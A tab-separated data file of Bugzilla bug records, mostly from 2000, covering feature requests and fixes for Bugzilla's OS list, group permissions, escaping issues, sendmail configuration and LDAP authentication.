44301%TAB%962305059%TAB%8386%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%NetBSD and OpenBSD are not listed in operating system section%TAB%NetBSD and OpenBSD are not listed in operating system sectionWhen submitting a bug using Bugzilla it is possible to specify the operating system on which the bug was discovered. This list contains a number of operating systems, but does not contain NetBSD (http://www.netbsd.org) and OpenBSD (http://www.openbsd.org).  Both of these are BSD-derived operating systems, just like FreeBSD which is included in the list.  Doing a query of the existing bugs shows that there are bugs that have been  written for these operating systems. Therefore, IMHO, it makes sense that  there should be entries for these in the list of operating systems.
44453%TAB%962568653%TAB%13548%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need Windows ME OS option%TAB%Need Windows ME OS optionWindows Millennium Edition [Windows ME] recently went RTM.  Beta testers such  as myself are receiving the gold copy this week, and thus, a new "Windows ME"  item is needed after "Windows 98" and before "Windows 2000" in the Bugzilla OS  dropdown.
44595%TAB%962803131%TAB%4809%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs,attachment and request management%TAB%[RFE] Need ability to edit/delete attachments,Need ability to edit/delete attachments,interface for administrator to delete attachments%TAB%[RFE] Need ability to edit/delete attachments,Need ability to edit/delete attachments,interface for administrator to delete attachmentsI don't know if "GOD" users have this capability, but it would be nice if users could at least edit and delete their attachments. That way, when an attachment mistake is made (like I made with bug 44437), I don't have to tell people to ignore the bad attachments.
44609%TAB%962810499%TAB%16345%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Remove the useless "project" column in the Change columns page%TAB%Remove the useless "project" column in the Change columns pageAs far as I can tell, there is no such thing as a "project" column, but it appears on the "Change columns" page and is confusing.
44617%TAB%962815383%TAB%15128%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%edit*.cgi: Should show which product you're working on%TAB%edit*.cgi: Should show which product you're working onAs an admin user, there's three CGI's that allow you to work on the version,  components and milestones for the products you're tracking.  IF you're doing alot of data entry (on a new installation for instance) you can  get confused about which product you're working on. Sure, you could look in the  URL and read the ?product=XX listing, but why not print it out right where  you're working?  editversion.cgi editcomponent.cgi editmilestone.cgi
44622%TAB%962819371%TAB%15128%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%perl5.6 vs perl5.005 -w: more anal 5.6 cause errors,perl5.6 vs perl5.005 -w: more anal 5.6 causes errors%TAB%perl5.6 vs perl5.005 -w: more anal 5.6 cause errors,perl5.6 vs perl5.005 -w: more anal 5.6 causes errorsthe latest perl5.6 seems to be alot more anal than the previous 5.005 in it's -w  and "strict" checking.  I've found three files that need a few syntax adjustments to survive the  upgrade.
44653%TAB%962868519%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Products with / in don't get any chart data%TAB%Products with / in don't get any chart dataWe have a product with a '/' in it.  There is processing in collectstats.pl to mangle any /'s in a product name into a '-' to create a safe filename, but then it uses this mangled product name in the query.  So no bug counts are found :(  I'll attach a patch in a bit
44691%TAB%962887000%TAB%12919%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Userregexp matching for new product should be case-insensitive%TAB%Userregexp matching for new product should be case-insensitiveIn editproducts.cgi, when creating a new product, if the usebuggroups operating  parameter is on, then a new bug group is created for that product and any  existing users matching the group's userregexp are added to the group.  However,  this pattern match appears to be case sensitive, where it should be case  insensitive (since login_names are email addresses, and are case insensitive;   the match in InsertNewUser in globals.pl is case insensitive).  It's simple to  fix, but pretty important.  I'll attach a patch with the necessary change.
45116%TAB%963268612%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Above -> Below%TAB%Above -> Beloweditparams.cgi:  "If off, then all bugs initially have the default priority selected above."  ->  "If off, then all bugs initially have the default priority selected below."
45118%TAB%963270301%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Target milestone setup issue.%TAB%Target milestone setup issue.When I tried to create a bug on a local Bugzilla it gave the message "A legal target_milestone was not set; this may indicate a bug in your browser.".  It appears that checksetup.pl creates TestProduct with no milestones, whereas it should create the default milestone.  AFAICS, there's no other way to make this situation occur, as editproducts.cgi creates the default milestone automatically.  I'm sure most people delete the product immediately, but if they don't and they're just testing, there's no reason to make life harder on them and possibly turn them away from Bugzilla.
45164%TAB%963312333%TAB%12919%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%New user from editusers.cgi completely ignores userregexp of groups%TAB%New user from editusers.cgi completely ignores userregexp of groupsI'm not certain if this is a bug or a feature.  I'd consider it to be a bug, but  YMMV.  If an administrator-type person goes to editusers.cgi, and adds a new user from  there, the userregexps of the various groups are completely ignored.  Obviously,  the administrator has the ability to add the user to groups directly on the new  user screen.  Furthermore, there's no way to default the various checkboxes  before the login name is put in, so we can't start some of them checked unless  we turn it into a two-step process.  I see three feasible resolutions, off the top of my head:  1) This is a feature, not a bug.  We want to pretend that the userregexps don't  exist when entering users this way.  2) We can turn this into a two-step process, first entering the login name (and  Real Name, perhaps), and then doing the rest, and checking the checkboxes for  matching groups then.  3) At the least, we could have it emit some sort of warning if the login name  matches a regexp for a group into which the user was not put.  That way the  administrator can go and modify the permissions for the user, or ignore it, but  it will be intentional, and not an accidental miss.
45207%TAB%963329939%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration%TAB%Automated sanity check and e-mail.,Automated sanity check that can send an e-mail if there are problems%TAB%Automated sanity check and e-mail.,Automated sanity check that can send an e-mail if there are problemsAt the moment I believe it's too easy to miss problems with the database.  It would be nice if sanitycheck.cgi could automatically run periodically, and email the results to a person.  I guess the period would be configurable.
45213%TAB%963333623%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Place extra word in resolve dupe error.%TAB%Place extra word in resolve dupe error.When you try to resolve a bug as a duplicate of a non-existant number, you get the error message:  "You must specify a bug number of which this bug is a duplicate. The bug ..."  I suggest it should say "You must specify a valid bug number ..."
45349%TAB%963426809%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%RFE: `Change several bugs at once` add CCs change OS, remove CCs.,RFE: `Change several bugs at once` change OS.,`Change several bugs at once` change OS.%TAB%RFE: `Change several bugs at once` add CCs change OS, remove CCs.,RFE: `Change several bugs at once` change OS.,`Change several bugs at once` change OS.I have 99 bugs that i want to quickly become CC and change the OS to all. I can't w/o touching each one manually.  re: remove, supposing i no longer want to watch a list of bugs, i should be  able to make the list and ask bugzilla to remove me (as cc) from all of them.  in the also ran category: mass add/removal to the status board
45384%TAB%963475717%TAB%4003%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl fails to update very old bugzilla (10/1998) databases.%TAB%checksetup.pl fails to update very old bugzilla (10/1998) databases.When running checksetup.pl against a very old version of bugzilla (2.1, 10/1998) it fails in several places because database fields where added after 2.1 but before checksetup.pl was created.  These fields are never created causing failures in checksetup and recent versions of bugzilla (7/11/2000).  The fields that checksetup didn't add to my 2.1 database were: profiles.groupset bugs.target_milestone bugs.groupset bugs.qa_contact bugs.status_whiteboard products.disallownew products.milestoneurl  After changing checksetup to add these fields everything appeared to work correctly with the current bugzilla (7/11/2000).  I didn't however do an exhaustive test to make sure I'd added all the missing fields, or remove fields that are no longer used (that checksetup.pl didn't remove).  I would like to point out that I had to add the AddField for profiles.groupset in the "Populate groups table" area because the field is used there before the tables are updated.  I'm going to attach my changes to checksetup.pl.
45583%TAB%963693220%TAB%10297%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%all users get added to a group if userregexp is null in editproducts.cgi%TAB%all users get added to a group if userregexp is null in editproducts.cgiWhen you create a new group in editprogucts.cgi and have usebuggroups active, it  adds all users to the group if you leave the userregexp blank.  This is not the  expected behaviour, since if I'm leaving it blank, I'm expecting to have to add  people to it by hand.  I should have to enter a "." or somesuch (a regexp that  actually does match all users) if I want it to do that.  If I want to create a new private product, it's a pain in the butt to go through  and remove everyone else from the new product I just created.
45586%TAB%963700768%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%With usebuggroups, users shouldn't query products they can't access.%TAB%With usebuggroups, users shouldn't query products they can't access.If you use usebuggroups, users shouldn't see products on the query page that they  don't have access to.  Attaching a patch that corrects this.
45784%TAB%963919171%TAB%567%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla truncates URLs containing double quotes%TAB%Bugzilla truncates URLs containing double quotesI can set a url containing the double-quote character when I create the bug or  later, and e-mails show that the field is updated correctly.  When I visit the  bug, however, I don't see the " or anything after it, and when I submit  additional changes to the bug, the value actually gets truncated.  What's happening is that show_bug.cgi isn't escaping quotes in the url when it  puts the url as the value for the "url" textbox.  It also doesn't escape quotes  for the href of the "url" link next to the textbox.  This is a security hole that allows me to make you run a script that seems to  come from bugzilla.mozilla.org (I've set up a demonstration at an old "test  bug", bug bug 31322).  It's not that much easier to exploit than bug 38862,  which requires me to get you to click on an attachment and which doesn't seem  likely to be fixed soon, but I still think this bug should be fixed for 2.12.
45862%TAB%963997407%TAB%11026%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Query/Bug List%TAB%query for "does not contain" substring or regexp in Comment fails,query for "does not contain" substring or regexp in Comment (or any other field) fails,Allow query on "all comments" or "all attachments" in advanced query,Allow query on "all comments" or "all attachments" in advanced query - boolean chart fails for comment "does not contain" and "contains none",Allow query on "all comments" in advanced query - boolean chart fails for comment "does not contain" and "contains none"%TAB%query for "does not contain" substring or regexp in Comment fails,query for "does not contain" substring or regexp in Comment (or any other field) fails,Allow query on "all comments" or "all attachments" in advanced query,Allow query on "all comments" or "all attachments" in advanced query - boolean chart fails for comment "does not contain" and "contains none",Allow query on "all comments" in advanced query - boolean chart fails for comment "does not contain" and "contains none"just tried this on mozilla.org's implementation of bugzilla and it seems to be  busted here currently as well.   1. in the query form, in the "Description entry" text control, type "query"    and select "not (regular expression)" from the that item's select list.  2. select "Bugzilla" from the component list.  3. submit query.  4. in the bug list, click the "Long Format" button.  note that a bunch of bugs are returned that have the word "query" in them.  using the boolean chart stuff to search for bugs that do not have a given substring or regexp in the Comment also fails.
45918%TAB%964015649%TAB%17756%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Server Operations,Bugzilla,Bugzilla-General%TAB%Cookie setting not checked in bugzilla%TAB%Cookie setting not checked in bugzillaIf I have disabled cookies, I get problems with the login or  with changing passwords. For example, the system let me change  my password, but afterwards, it is not changed. Server should check if client browser allows cookies.
46002%TAB%964088875%TAB%12919%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%reports.cgi ignores group restrictions with usebuggroups on%TAB%reports.cgi ignores group restrictions with usebuggroups onI noticed the other day that reports.cgi doesn't check for the usebuggroups  parameter, and thus doesn't restrict access to reports for products by bug group  if it's on.  I consider this a bug, and so I've corrected it on my local  installation.  If people don't have permission to access the bugs of a product, they shouldn't  be able to get reports on that product either, right?
46207%TAB%964299896%TAB%17691%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%bugidtype=exclude breaks buglist.cgi in Bugzilla%TAB%bugidtype=exclude breaks buglist.cgi in Bugzillabuglist.cgi?bugidtype=exclude returns an error message (e.g. if I use query.cgi's "[Exclude] bugs numbered: [...]").  To reproduce, visit the URL specified above.  Results: "Software error: Internal error: Can't seem to handle '<code>bug_id</code>' and '<code>noexact</code>' together at /opt/webtools/bugzilla/buglist.cgi line 613."    [Enhancements - don't bother if they takes more than 5 additional minutes when you are fixing this bug anyway]  - The URL would be more readable if a bug numbers could be separated by spaces as well as commas.  That is, '+' instead of '%2C' in the URL.  - For that matter, what I'd really like is bugidtype=Add, not Include/Exclude. That is, a set of bugIDs to be listed in addition to the ones specified by the rest of the form. Or if nobody ever used bugidtype=exclude and that's why it's (still) buggy, maybe you could just as well drop bugidtype and instead allow us to say 'bug_id=2222/-2222/+2222' to include/exclude/add bug 2222 to the list.
46296%TAB%964437488%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Administration%TAB%Move params into DB and make editparams.cgi be multi-panel by category,Make editparams.cgi be multi-panel by category%TAB%Move params into DB and make editparams.cgi be multi-panel by category,Make editparams.cgi be multi-panel by categoryI keep seeing mention in bug reports here and there about doing this, but I can't  find one specifically for doing this, so I'm creating one.  The params need to be moved out of a flat-file into the database, so that the  parameter definition is easily expansible (such as adding a category column for  each parameter - see below).  Also, editparams.cgi needs to be changed to use the above suggested param format  in order to sort parameters by category, probably in a multi-panel format,  similar to the way the user preferences are currently handled.
46896%TAB%964795312%TAB%15368%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%There is a period in the title of this page,Period in the title of notargetmilestone.html%TAB%There is a period in the title of this page,Period in the title of notargetmilestone.htmlPeriod in the title of notargetmilestone.html This page has a period in it's title.
46897%TAB%964795421%TAB%18010%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%"Content-disposition: attachment" prompts download on IE5%TAB%"Content-disposition: attachment" prompts download on IE5Each of these CGI files  reports.cgi buglist.cgi long_list.cgi  produces this HTTP header line  Content-disposition: attachment; filename=<filename>  There is a known problem in IE5 (see Knowledge Base article Q221998 at  support.microsoft.com): the browser will attempt to download the file to the  user's machine, rather than displaying it.  Changing the disposition to "inline" for each of these CGI files appears to  work correctly.
46913%TAB%964814947%TAB%16549%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%URL gives sql error when loaded%TAB%URL gives sql error when loadedIt's still there.  Reopening.  The difference:  I wasn't logged in yet when I  tried it.  If you're logged in, it works.  If you're not logged in, you get an  error.  Apparently when you're not logged in, $::usergroupset is getting set to null,  when it should be getting set to 0.  My guess is that something's goofed in  quietly_check_login() in CGI.pl.  fyi, the new bugzilla server's giving funky error messages...  <?xml version="1.0" standalone="no"?> <!DOCTYPE bugzilla SYSTEM "http://bugzilla.mozilla.org/bugzilla.dtd"> <bugzilla version="2.11" urlbase="http://bugzilla.mozilla.org/" maintainer= "dmose@mozilla.org"> Content-type: text/html  <H1>Software error:</H1> <CODE>     select       bugs.bug_id, product, version, rep_platform, op_sys, bug_status,       resolution, priority, bug_severity, component, assigned_to, reporter,       bug_file_loc, short_desc, target_milestone, qa_contact,       status_whiteboard, date_format(creation_ts,'%Y-%m-%d %H:%i'),       groupset, delta_ts, sum(votes.count)     from bugs left join votes using(bug_id)     where bugs.bug_id = 46872     and bugs.groupset &  = bugs.groupset     group by bugs.bug_id: You have an error in your SQL syntax near '=  bugs.groupset     group by bugs.bug_id' at line 10 at globals.pl line 134. </CODE> <P> Please send mail to this site's webmaster for help.
46935%TAB%964857525%TAB%17995%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Interface%TAB%%commandmenu% is ignored in headerhtml%TAB%%commandmenu% is ignored in headerhtmlThe %commandmenu% text is not expanded when entered in headerhtml.  That is correct.  the headerhtml area in editparams.cgi is strictly for HEAD information, including cascading stylesheets and meta information. You should put %commandmenu% in "bannerhtml", not "headerhtml".  If you do, works great.  This should be resolved invalid.
47251%TAB%965145879%TAB%15368%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%Make bugzilla use valid HTML,Make bugzilla use valid HTML 4.01 Transitional,Make bugzilla use valid HTML 4.01 Transitional except for WRAP which is covered by some other bug,Make bugzilla use valid HTML 4.01 Transitional,Make bugzilla use valid HTML 4.01 Transitional (initial attempt)%TAB%Make bugzilla use valid HTML,Make bugzilla use valid HTML 4.01 Transitional,Make bugzilla use valid HTML 4.01 Transitional except for WRAP which is covered by some other bug,Make bugzilla use valid HTML 4.01 Transitional,Make bugzilla use valid HTML 4.01 Transitional (initial attempt)I feel that bugzilla should output valid html in all it's pages. This shouldn't  be too hard to do and would make it easier for nonstandard devices and  browsers to access the system. I would be willing to work on this, but I  would not be able to do the whole thing (not knowing that much about the  system) and would need help from others.
47561%TAB%965336115%TAB%18202%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Incorrect group bit used for new group%TAB%Incorrect group bit used for new groupeditgroups.cgi:261 value is 65535 - this is one less than it should be, 65536; reasons should be obvious (how did this never get found? huh).  As soon as you add a new group with this value, everything in edituser.cgi just breaks hard (as I'm sure it does elsewhere).  Stopped me from using groups completely till I tracked it down, hence the Blocker severity.
47669%TAB%965394254%TAB%10173%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%editproducts.cgi line 582 uses old $::db->query%TAB%editproducts.cgi line 582 uses old $::db->queryThere is a problem with the delete bugs function in the latest CVS tree of editproducts.cgi  I do no know how to make diffs but here is the code that should replace lines 582-588 (aprox)              SendSQL("DELETE FROM attachments WHERE bug_id=$bugid");             SendSQL("DELETE FROM bugs_activity WHERE bug_id=$bugid");             SendSQL("DELETE FROM dependencies WHERE blocked=$bugid");  Ok well there is still a bug then. Because the command $::db->query does not execute. Try deleting a product that has bugs against it. (Assuming that the parameter is turned on) I do not recall what the error was but it did not let me delete products.  $::db->query is a very odd way to use DBI. Infact I do not see it as a documented function of DBI. I believe it should be $::db->do("BLAH") if you do not plan on returning any results from the query.  or $::db->prepare; $::db->execute  unless $::db->query is something new to ver 1.14 (I am using 1.13) of DBI. If that is true the bugzilla dependancy for DBI should show this  $::db->query also appears: line 429 of editmilestones.cgi line 603 of editproducts.cgi line 440 of editversions.cgi  hmm, now that you mention it, you're right.  :)  I usually see $::db->do for  that.  I just went through the docs for DBI, and there is no query() method. Replacing all of those with $::db->do() should fix it.
47726%TAB%965425458%TAB%16549%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Doesn't display properly in IE5.5 because bug url & are not encoded%TAB%Doesn't display properly in IE5.5 because bug url & are not encodedIn ie5.5, url above gives  A semi colon character was expected. Line 20, Position 77   <bug_file_loc>http://inspcl.infospace.com/info/classads/iclass? cat=gene&op=search&PDBN=INSPGPRICE&NEXTF=switchv&QFDMA=0&QDMA=&QCQS=&QC=&QS=&QZ= &QO=&QREG=0&QVCAT=1&_debug=&_DEFDMA=&QVSCAT=1&QVCAT=1&QVSSCAT=1&firstsearch=1&CA TFILE=/classads/gene_mstr.html&VTITLE=General+Ads&TITLE=&_ADV_ST=2&_ADV_SRC=&_AD V_USR=</bug_file_loc>  Which points to the = after gene&op in the url  In bug.pm, the bug_file_loc field isn't run through QuoteXMLChars.
47914%TAB%965650964%TAB%4150%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Cookies,Bugzilla,Bugzilla-General%TAB%Cannot stay logged in to bugzilla,Login/Logout indicator at bottom of bugzilla screen is wrong,Cannot stay logged in to Bugzilla,buglist.cgi always has a not-logged-in page footer%TAB%Cannot stay logged in to bugzilla,Login/Logout indicator at bottom of bugzilla screen is wrong,Cannot stay logged in to Bugzilla,buglist.cgi always has a not-logged-in page footerUsing today's first M17 spin, I can't stay logged in to bugzilla.  I go to the query page, see that I'm not logged in, log in, execute a query, and the result page shows me as not logged in.  I can't even tell if my queries are being run using my login.  This was also happening on the trunk, and on Friday's build.
48707%TAB%966008932%TAB%4385%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Query result as xml output%TAB%Query result as xml outputI have modified the buglist.cgi to output XML. I am attaching the patch.  Adding xmlout=1 to the URL (buglist.cgi?xmlout=1) the result will be xml.
48822%TAB%966138693%TAB%8444%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Interface%TAB%Bugzapp -- an XPToolkit interface to Bugzilla,Bugzapp (Bugxula) -- an XPToolkit interface to Bugzilla%TAB%Bugzapp -- an XPToolkit interface to Bugzilla,Bugzapp (Bugxula) -- an XPToolkit interface to BugzillaBugzilla should have an interface constructed out of XUL, CSS, JS, and Necko  bits, as an alternative to the Web version.  An XPToolkit interface to Bugzilla would have the potential to greatly improve  the productivity of QA people, because it would be able to have a much better  user interface than the Web version. It would also be a testing ground for  XPToolkit as a platform for database apps.  Ideally, the same Bugzapp client would be able to be used with multiple Bugzilla  installations -- and a change in a Bugzilla database should not mean that the  client needs to be updated. This means that Bugzilla must become more modular and  transparent about what fields it uses, and what values it allows for each field.  If anyone is interested in working on such an app, I can rustle up some UI specs  for it.
48947%TAB%966245257%TAB%15368%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Confusing line in checksetup.pl module checking%TAB%Confusing line in checksetup.pl module checkingIf the mysql database driver isn't installed, checksetup.pl reports the  following:  [zach ****]$ ./checksetup.pl Checking perl modules ... Uncaught exception from user code:         Please install the Mysql database driver. You can do this by running  (as root)         perl -MCPAN -eshell        install Msql-Mysql  Be sure to enable the Mysql emulation! at ./checksetup.pl line 148.  At the bottom it seems to say that mysql emulation must be enabled in the  checksetup.pl script at 148, not in the install "quiz" script where it really is  enabled.
49063%TAB%966332314%TAB%4415%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%no sanity checking when setting duplicate%TAB%no sanity checking when setting duplicateWas looking at bug 48845 and tried to mark it as a duplicate of bug 18213. A bug in mozilla's form handling messed up the hidden field in the bug form and changed the hidden field named 'id', from value 48845 to 4884548845.  Bugzilla then marked bug 18213 as being a duplicate of the non-existant bug 4884548845. <INPUT TYPE=HIDDEN NAME="id" VALUE=48845>  Bugzilla should do more error checking and verify that the bug number its trying to process actually exists.
823449%TAB%1355966799%TAB%258347%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Fix 'Services.appshell', should be 'Services.appShell' (documentation was wrong)%TAB%Fix 'Services.appshell', should be 'Services.appShell' (documentation was wrong)http://mxr.mozilla.org/comm-central/source/chat/modules/hiddenWindow.jsm#11 has   Services.appshell.hiddenDOMWindow which should be   Services.appShell.hiddenDOMWindow  The documentation was wrong on this :/. Upcoming patch.
49298%TAB%966468597%TAB%18534%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bug 38997 should be left open: bug-form should work without Javascript%TAB%Bug 38997 should be left open: bug-form should work without JavascriptClosing a bug with wontfix seems rude to me unless it is proved unfixable. I lost another hour today with this bug. JavaScript programmers must be able to write their forms in a way to not drive people with JS turned off away.
49306%TAB%966482086%TAB%3853%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Resolution field not displaying,Resolution field not set when mid-air collision happens%TAB%Resolution field not displaying,Resolution field not set when mid-air collision happensin bug 49118, hyatt closed the bug but no resolution was set. He was using 4.x and says this keeps happening. Dave, do you know how to reproduce it? What was the resolution supposed to be? It looks like invalid. I only see two bugs owned by hyatt with blank resolution and one of them was closed by someone else. Maybe he fixed them already.  Looking at other bugs in that list i see what looks like people marking bugs fixed and 'fixed' not showing up. The last couple bugs might be  worksforme or invalid.
49893%TAB%966957984%TAB%19057%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Ability to use different SMTP server%TAB%Ability to use different SMTP serverRight now, bugzilla requires that the machine it is running also be running an  SMTP server. It would be nice if there were a configuration item to define  which server and which port bugzilla should connect to, rather than trusting  that the user has installed Sendmail correctly.
50159%TAB%967100561%TAB%19069%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Postfix's sendmail analogon chokes on "-ODeliveryMode=deferred" (Fix included :-)%TAB%Postfix's sendmail analogon chokes on "-ODeliveryMode=deferred" (Fix included :-)In file 'processmail', line #587 this statement:      open(SENDMAIL, "|/usr/lib/sendmail -ODeliveryMode=deferred -t") ||       die "Can't open sendmail";  causes Postfix's sendmail analogon _not_ to send the mail, because it does not support the "-ODeliveryMode=deferred" flag. Therefore, it is simply fixed by:      open(SENDMAIL, "|/usr/lib/sendmail -t") || die "Can't open sendmail";  if you run Postfix. Postfix provides sendmail, mailq and some other programs for easy migration from sendmail but apparently this -O flag is not supported (-t is supported and mentioned in the man page).  Maybe it's an idea to put a '$postfix = 0 (no) or 1 (yes)' in checksetup.pl and localconfig? Under SuSE Linux 6.4 you can test for Postfix presence with:      my $postfix = (-x "/usr/sbin/postfix") ? 1 : 0;  Fyi: Postfix (www.postfix.org) is a very secure mta, developed and open-sourced by Wietse Venema working for IBM and aimed at replacing sendmail. Postfix has better security, maintainability and configurability, performance and disk usage than sendmail (it's worth looking at!).
50279%TAB%967160133%TAB%19069%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%importxml.pl is missing in list of executable files in checksetup.pl (Fix included)%TAB%importxml.pl is missing in list of executable files in checksetup.pl (Fix included)In file checksetup.pl the Perl script importxml.pl is missing in the list of files which need to be marked executable. In line #436 is should be added to 'my @executable_files':  # These are the files which need to be marked executable my @executable_files =    ('processmail', 'whineatnews.pl', 'collectstats.pl', 'checksetup.pl',     'syncshadowdb', 'importxml.pl');
50515%TAB%967418900%TAB%11608%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%"most recently doomed" page lists m16 bugs instead of m18 bugs%TAB%"most recently doomed" page lists m16 bugs instead of m18 bugsm16 was a while ago.  i guess bugzilla isn't keeping up with the milestones.
50647%TAB%967506181%TAB%15128%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%RFE: yp_nomail.sh contribution%TAB%RFE: yp_nomail.sh contribution# Our mail admins got annoyed when bugzilla kept sending email # to people who'd had bugzilla entries and left the company.  They # were no longer in the list of valid email users so it'd bounce. # Maintaining the 'data/nomail' file was a pain.  Luckily, our UNIX # admins list all the users that ever were, but the people who've left # have a distinct marker in their password file. For example: # # fired:*LK*:2053:1010:You're Fired Dude:/home/loser:/bin/false # # This script takes advantage of the "*LK*" convention seen via  # ypcat passwd and dumps those people into the nomail file. Any # manual additions are kept in a "nomail.(domainname)" file and  # appended to the list of yp lockouts every night via Cron # # 58 23 * * * /export/bugzilla/contrib/yp_nomail.sh > /dev/null 2>&1
50698%TAB%967545431%TAB%2433%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%parameter for sendmail deferred mode%TAB%parameter for sendmail deferred modei get tired of having to move processmail out of the way everytime i want to  check in a change. there should be a parameter for the sendmail deferred mode so  that it can be easily toggled on or off without having to touch and modify local  copies of processmail.
51182%TAB%967888929%TAB%12919%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Accounts%TAB%Bugzilla should allow LDAP authentication (tracking bug),Bugzilla should allow LDAP authentication%TAB%Bugzilla should allow LDAP authentication (tracking bug),Bugzilla should allow LDAP authenticationI've been working on adding LDAP authentication to Bugzilla, bit by bit.  This  bug is a tracking bug for the various components of the task.  I will be adding  several more bugs to track the individual pieces, and marking dependencies on  this bug.  See the dependency tree for more information on this branch.
51184%TAB%967890089%TAB%12919%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%New parameters needed for LDAP authentication%TAB%New parameters needed for LDAP authenticationThere are four new parameters that I think are necessary for LDAP authentication  to Bugzilla:  1) useLDAP: A boolean to determine whether or not we're using LDAP for  authentication.  2) LDAPServer: The location (name:port) of the LDAP server.  3) LDAPBaseDN: The BaseDN under which we can find users.  4) LDAPMailAttribute: The name of the attribute which contains the email  address; we need this for logging the user into the Bugzilla database  afterwards.
51185%TAB%967890225%TAB%12919%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%confirm_login needs to be updated to allow LDAP authentication%TAB%confirm_login needs to be updated to allow LDAP authenticationThe changes needed for CGI.pl are:  1) Check for the existence of the Mozilla::LDAP module. 2) In confirm_login:   A) If useLDAP is set, then we spit out the login form slightly differently to  reflect that, and don't allow the user to request that their password be mailed  to them.  (We can't look up a user's password in LDAP;  they'd need to contact  an LDAP administrator for that.)   B) If useLDAP is set and we've got a username and password input, then we  authenticate the user against the LDAP directory.  Once this is done, we then  secretly log in the user against the Bugzilla database, since we're still using  that to store other information such as groupset, etc.  We use the mail  attribute of the LDAP entry to identify the user, and it's all good.   C) If a user successfully authenticates against the LDAP directory, but does  not have an account in the Bugzilla database, then we create one.  Note that  since we're using LDAP for authentication, we don't mail the password to the  user.  Once all this is done, a user should be able to log in to Bugzilla via LDAP.
